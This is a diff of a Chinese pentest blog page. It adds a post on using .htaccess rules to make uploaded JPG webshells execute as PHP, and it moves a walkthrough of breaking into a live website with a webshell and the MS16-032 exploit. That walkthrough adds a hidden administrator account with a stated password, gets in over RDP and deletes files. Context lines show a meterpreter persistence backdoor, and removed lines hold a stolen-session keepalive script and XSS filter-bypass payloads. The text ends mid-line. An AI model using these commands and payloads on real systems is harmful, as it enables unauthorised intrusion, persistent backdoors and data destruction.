@@ -78,7 +78,7 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2018/02/27/保证session不被服务器因超时注销/" title="即可保证session不被服务器因超时注销" itemprop="url">即可保证session不被服务器因超时注销</a>
+      <a href="/2018/02/27/htaccess配合apache 提权/" title="htaccess配合apach提权" itemprop="url">htaccess配合apach提权</a>
   </h1>
   <p class="article-author">By
        
@@ -91,7 +91,20 @@
 </header>
     <div class="article-content">
         
-        <p>拿到服务器后很容易被服务器注销，因此我们可以用javascript来写段代码<br>使用方法:<br>拿到偷到的session登陆后,再地址栏敲入下面代码,即可保证session不被服务器因超时注销.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javascript:(function sogili() &#123;</span><br><span class="line">    setInterval(function () &#123;_ = new XMLHttpRequest || new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);_.open(&quot;GET&quot;, location);_.send(null);&#125;, 60000);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p>
+        <p>经常会有人批量拿shell。特别是upload shell这样的漏洞。</p>
+<p>拿下之后最简单的修补方法是，上传一个.</p>
+<p>.HTACCESS文件到该木马，先把你的马儿转移到别的目标。</p>
+<p>.HTACCESS内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.(php|php3|php4|php5|php6|php2)&quot;&gt;</span><br><span class="line">Deny from all</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></p>
+<p>当然这是不完善的，经过我测试，Php即可轻松绕过，可以自行添加</p>
+<p>那么别人传的马儿自然无法执行了。</p>
+<p>逆向思维一下，当我们拿到一个后台权限，上传PHPshell，可恨的是，他会自动把PHP这个关键词改成PHP-，</p>
+<p>加一个横杠，有木有，特别是韩国站比较多见。</p>
+<p>如果你运气不是那么背，环境是apache的，并且支持.HTACCESS，那么，恭喜你</p>
+<p>上传一个.HTACCESS，内容是</p>
+<p>AddType   application/x-httpd-php     .jpg<br>然后再传一个JPG结尾的shell，访问即可执行了</p>
+<p>刚刚用到，顺手发上来了.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files demo.jpg&gt;</span><br><span class="line">ForceType application/x-httpd-php</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>
+<p>这种只有是指定文件名的文件，才能被当做PHP解析.</p>
 
         
         
@@ -104,7 +117,7 @@
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/XSS/">XSS</a>
+  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/提权/">提权</a>
 </div>
 
 
@@ -167,6 +180,78 @@
 <p><img src="http://opgnaclz6.bkt.clouddn.com/12.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"><br>如图，第一次我执行NT AUTHORITY\SYSTEM失败了，因为少了一个/<br>meterpreter &gt; getuid<br>Server username: NT AUTHORITY\SYSTEM<br>得到SYSTEM后你可以进shell添加管理员账户密码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure></p>
 <p>或者留下后门<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run?persistence?-X?-i?10?-p?6666?-r?192.168.163.129</span><br></pre></td></tr></table></figure></p>
 
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/提权/">提权</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/01/15/MS16-032提权/" title="MS16-032提权" itemprop="url">MS16-032提权</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2018-01-15T10:37:51.000Z" itemprop="datePublished"> 发表于 2018-01-15</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>这是一个黄网的站，所以我就不打码了。如果要看我是如何GetShell的可以在我博客上看另一篇“iis7.5解析GetShell”。废话不多说了，我们开始吧！<br>PS：操作很白痴，大牛勿喷——Bug’小虫</p>
+<h3 id="1-刚开始用的php一句话，发现执行不了命令"><a href="#1-刚开始用的php一句话，发现执行不了命令" class="headerlink" title="1,刚开始用的php一句话，发现执行不了命令"></a>1,刚开始用的php一句话，发现执行不了命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/13.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="2-上asp一句话，成功执行"><a href="#2-上asp一句话，成功执行" class="headerlink" title="2,上asp一句话，成功执行"></a>2,上asp一句话，成功执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/14.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="3-systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来"><a href="#3-systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来" class="headerlink" title="3,systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来"></a>3,systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8080.tmp</span><br></pre></td></tr></table></figure>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/15.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="4-上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户"><a href="#4-上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户" class="headerlink" title="4,上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户"></a>4,上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32.log <span class="string">"net user caibao Heimao123!@# /add"</span>//我把ms16-032改名为32.log了</span><br></pre></td></tr></table></figure>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/15.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="5-用户添加成功"><a href="#5-用户添加成功" class="headerlink" title="5,用户添加成功"></a>5,用户添加成功</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/16.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="6-提到管理员用户组"><a href="#6-提到管理员用户组" class="headerlink" title="6,提到管理员用户组"></a>6,提到管理员用户组</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32.log <span class="string">"net localgroup administrators caibao /add"</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/17.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="7-连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip"><a href="#7-连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip" class="headerlink" title="7,连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip"></a>7,连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/18.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="8，查看一下TermService服务对应的PID，1884"><a href="#8，查看一下TermService服务对应的PID，1884" class="headerlink" title="8，查看一下TermService服务对应的PID，1884"></a>8，查看一下TermService服务对应的PID，1884</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /avc</span><br></pre></td></tr></table></figure>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/19.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="9-根据PID查找端口，果然被他改成了"><a href="#9-根据PID查找端口，果然被他改成了" class="headerlink" title="9,根据PID查找端口，果然被他改成了"></a>9,根据PID查找端口，果然被他改成了</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/20.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="10-连接远程桌面，成功连接。把它里面黄色资源一删，走人"><a href="#10-连接远程桌面，成功连接。把它里面黄色资源一删，走人" class="headerlink" title="10,连接远程桌面，成功连接。把它里面黄色资源一删，走人"></a>10,连接远程桌面，成功连接。把它里面黄色资源一删，走人</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/21.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"><br>总结：其实总体来说还是非常顺利的，主要是16-32提2012时不是很稳定，如果失败的话可以多试两次,或许有意向不到的收获。还有就是用metasploit反弹shell时失败，因为16-032不一定要反弹shell。所以没去研究。下次遇到的话可以从防火墙入手，查看端口规则，有可能端口被拦截。</p>
+<h3 id="—–-Powered-by-Bug’小虫"><a href="#—–-Powered-by-Bug’小虫" class="headerlink" title="—– Powered by Bug’小虫"></a>—– Powered by Bug’小虫</h3>
         
         
         <p class="article-more-link">
@@ -444,78 +529,6 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2018/01/15/MS16-032提权/" title="MS16-032提权" itemprop="url">MS16-032提权</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
-		
-  <p class="article-time">
-    <time datetime="2018-01-15T10:37:51.000Z" itemprop="datePublished"> 发表于 2018-01-15</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <p>这是一个黄网的站，所以我就不打码了。如果要看我是如何GetShell的可以在我博客上看另一篇“iis7.5解析GetShell”。废话不多说了，我们开始吧！<br>PS：操作很白痴，大牛勿喷——Bug’小虫</p>
-<h3 id="1-刚开始用的php一句话，发现执行不了命令"><a href="#1-刚开始用的php一句话，发现执行不了命令" class="headerlink" title="1,刚开始用的php一句话，发现执行不了命令"></a>1,刚开始用的php一句话，发现执行不了命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/13.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="2-上asp一句话，成功执行"><a href="#2-上asp一句话，成功执行" class="headerlink" title="2,上asp一句话，成功执行"></a>2,上asp一句话，成功执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/14.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="3-systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来"><a href="#3-systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来" class="headerlink" title="3,systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来"></a>3,systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8080.tmp</span><br></pre></td></tr></table></figure>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/15.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="4-上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户"><a href="#4-上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户" class="headerlink" title="4,上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户"></a>4,上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32.log <span class="string">"net user caibao Heimao123!@# /add"</span>//我把ms16-032改名为32.log了</span><br></pre></td></tr></table></figure>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/15.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="5-用户添加成功"><a href="#5-用户添加成功" class="headerlink" title="5,用户添加成功"></a>5,用户添加成功</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/16.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="6-提到管理员用户组"><a href="#6-提到管理员用户组" class="headerlink" title="6,提到管理员用户组"></a>6,提到管理员用户组</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32.log <span class="string">"net localgroup administrators caibao /add"</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/17.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="7-连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip"><a href="#7-连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip" class="headerlink" title="7,连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip"></a>7,连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/18.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="8，查看一下TermService服务对应的PID，1884"><a href="#8，查看一下TermService服务对应的PID，1884" class="headerlink" title="8，查看一下TermService服务对应的PID，1884"></a>8，查看一下TermService服务对应的PID，1884</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /avc</span><br></pre></td></tr></table></figure>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/19.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="9-根据PID查找端口，果然被他改成了"><a href="#9-根据PID查找端口，果然被他改成了" class="headerlink" title="9,根据PID查找端口，果然被他改成了"></a>9,根据PID查找端口，果然被他改成了</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/20.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="10-连接远程桌面，成功连接。把它里面黄色资源一删，走人"><a href="#10-连接远程桌面，成功连接。把它里面黄色资源一删，走人" class="headerlink" title="10,连接远程桌面，成功连接。把它里面黄色资源一删，走人"></a>10,连接远程桌面，成功连接。把它里面黄色资源一删，走人</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/21.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"><br>总结：其实总体来说还是非常顺利的，主要是16-32提2012时不是很稳定，如果失败的话可以多试两次,或许有意向不到的收获。还有就是用metasploit反弹shell时失败，因为16-032不一定要反弹shell。所以没去研究。下次遇到的话可以从防火墙入手，查看端口规则，有可能端口被拦截。</p>
-<h3 id="—–-Powered-by-Bug’小虫"><a href="#—–-Powered-by-Bug’小虫" class="headerlink" title="—– Powered by Bug’小虫"></a>—– Powered by Bug’小虫</h3>
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-<div class="article-categories">
-  <span></span>
-  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/提权/">提权</a>
-</div>
-
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
       <a href="/2017/10/17/linxu安装wps后无法启动的问题解决方法/" title="linxu安装wps后无法启动的问题解决方法" itemprop="url">linxu安装wps后无法启动的问题解决方法</a>
   </h1>
   <p class="article-author">By
@@ -557,80 +570,6 @@
 <div class="article-categories">
   <span></span>
   <a class="article-category-link" href="/categories/杂七杂八/">杂七杂八</a>►<a class="article-category-link" href="/categories/杂七杂八/工具/">工具</a>
-</div>
-
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2017/09/28/绕过XSS-Filter及其它一些XSS构造方法/" title="绕过XSS-Filter" itemprop="url">绕过XSS-Filter</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
-		
-  <p class="article-time">
-    <time datetime="2017-09-28T08:42:19.000Z" itemprop="datePublished"> 发表于 2017-09-28</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <p>XSS-Filter一般是基于黑白名单的安全过滤策略，既把要处理的数据分成白名单和黑名单两大列表，白名单是可信数据，黑名单则相反。假定某个程序基于黑名单式的过滤策略，那么，当用户提交信息时，该系统的XSS-Filter会对所有数据进行检验，如检测到黑名单的数据，便进行拦截，编码和消毒过滤处理。<br>简单的来说，XSS-Filter实际上就是一段过滤函数。这段代码的功能封装在filter_xss()中，只要程序在处理输入时尽量使用该函数，就可以过滤常见的XSS。下面介绍一些常见的绕过方式。</p>
-<h3 id="1，利用-lt-gt-标记注射Html-Javascript。"><a href="#1，利用-lt-gt-标记注射Html-Javascript。" class="headerlink" title="1，利用&lt;&gt;标记注射Html/Javascript。"></a>1，利用&lt;&gt;标记注射Html/Javascript。</h3><p>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(‘xss’);&lt;script&gt;</span><br></pre></td></tr></table></figure></p>
-<h3 id="2，利用标签属性执行XSS"><a href="#2，利用标签属性执行XSS" class="headerlink" title="2，利用标签属性执行XSS"></a>2，利用标签属性执行XSS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=”javascript:alert(/xss/)”&gt;&lt;/table&gt;</span><br><span class="line">&lt;img src=”javascript:alert(‘xss’)”&gt;</span><br><span class="line">href=</span><br><span class="line">lowsrc=</span><br><span class="line">bgsound=</span><br><span class="line">background=</span><br><span class="line">value=</span><br><span class="line">action=</span><br><span class="line">dynsrc=</span><br></pre></td></tr></table></figure>
-<p>等都可以测试，但是前提是浏览器要支持伪协议</p>
-<h3 id="3，空格，回车，Tab"><a href="#3，空格，回车，Tab" class="headerlink" title="3，空格，回车，Tab"></a>3，空格，回车，Tab</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=”javas	cript:alert(/xss/)” width=100&gt;</span><br><span class="line">&lt;img src=”javas</span><br><span class="line">cript:</span><br><span class="line">alert(/xss/)” width=100&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="4-对标签属性值转码，因为HTML支持ASCII码的特性"><a href="#4-对标签属性值转码，因为HTML支持ASCII码的特性" class="headerlink" title="4,对标签属性值转码，因为HTML支持ASCII码的特性"></a>4,对标签属性值转码，因为HTML支持ASCII码的特性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=”javascript&amp;116&amp;#58alert(/xss/)”&gt;</span><br></pre></td></tr></table></figure>
-<p>自己根据ASCII码可以自己修改，当然了，也可以综合上面的Tab键使用</p>
-<h3 id="5，产生自己的事件"><a href="#5，产生自己的事件" class="headerlink" title="5，产生自己的事件"></a>5，产生自己的事件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=”#” onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>
-<p>注：onerror事件是IMG标记的一个事件，只要页面中发生错误，该事件立刻被激活。因为图片地址不正确，所有也被激活了<br>还有许多事件可以利用，下面只是一部分，感兴趣的可以自己再网上了解一下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">onResume</span><br><span class="line">onSeek</span><br><span class="line">onTimeError</span><br><span class="line">onURLFlip</span><br></pre></td></tr></table></figure></p>
-<h3 id="6，利用CSS跨站剖析。"><a href="#6，利用CSS跨站剖析。" class="headerlink" title="6，利用CSS跨站剖析。"></a>6，利用CSS跨站剖析。</h3><p>XSS脚本的另一个载体是CSS样式表，使用CSS样式表执行JavaScript具有隐蔽，灵活多变等特点，但是CSS样式表有一个很大的缺点：各浏览器之间不能通用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-image:url(javascript:alert(&apos;xss&apos;))&quot;&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">	body &#123;background-image: url(&quot;javascript:alert(&apos;xss&apos;)&quot;);&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div style=&quot;width: expreeion(alert(&apos;xss&apos;));&quot;&gt;</span><br><span class="line">&lt;img src=&quot;#&quot; style=&quot;xss:expreesion(alert(/xss/));&quot;&gt;</span><br></pre></td></tr></table></figure></p>
-<p>注：expreession执行JavaScript代码，expreession用来把css属性和jiavascript表达式关联起来。</p>
-<h3 id="7，扰乱过滤规则"><a href="#7，扰乱过滤规则" class="headerlink" title="7，扰乱过滤规则"></a>7，扰乱过滤规则</h3><p>其实就是综合前面讲述的各种技巧<br>转换大小写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG src=&quot;javascript:alter(0);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
-<p>大小写混写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iMg sRC=&quot;jAvAscript:alert(0);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
-<p>不用双引号用单引号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&apos;javascript:alerta(0);&apos;&gt;</span><br></pre></td></tr></table></figure></p>
-<p>不使用引号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=javascript:alert(0);&gt;</span><br></pre></td></tr></table></figure></p>
-<p>用个反斜杠<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=&quot;mars.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim&quot;alt=&quot;mars&quot;&gt;</span><br><span class="line">&lt;img/src=&quot;javascript:alter(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
-<p>8，利用字符编码<br>利用XSS编码工具可以对XSS进行编码，javascript支持Unicode，escapes，十六进制，八进制等编码形式<br>9，拆分跨站法<br>有的地方存在XSS漏洞，但是网站管理员对字符长度写入做了限制，那么就可以用该方法绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z=&apos;document.&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;write(&quot;&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos;&lt;script&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos; src=ht&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos;tp://ww&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos;.net/1.&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos;js&gt;&lt;/sc&apos;&lt;/script&gt;</span><br><span 